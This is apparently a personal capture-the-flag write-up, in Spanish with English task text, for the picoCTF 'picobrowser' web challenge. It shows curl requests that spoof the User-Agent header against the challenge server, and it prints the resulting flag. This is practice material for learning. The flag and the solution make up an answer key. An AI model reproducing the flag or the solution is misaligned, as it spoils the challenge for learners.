# Reto
# Descripcion
This website can be rendered only by picobrowser, go and catch the flag!

Additional details will be available after launching your challenge instance.
# Solucion

Curl bash:
```
curl 'http://fickle-tempest.picoctf.net:63840/flag' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://fickle-tempest.picoctf.net:63840/flag' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 LibreWolf/138.0.1-1' \
  --insecure
```

Terminal
```
affogato1-picoctf@webshell:~$ curl http://fickle-tempest.picoctf.net:63840/flag -H
 "User-Agent:picobrowser"  | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2115  100  2115    0     0  31047      0 --:--:-- --:--:-- --:--:-- 31102
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}</code></p>
```
### Flag: picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}
# Notas
La pagina no permitia darme la bandera por el navegador asi que al dar click la boton flag la pagina mandaba una solicitud de la bandera, copie el curl bash y busque la bandera con un grep.
# Referencias
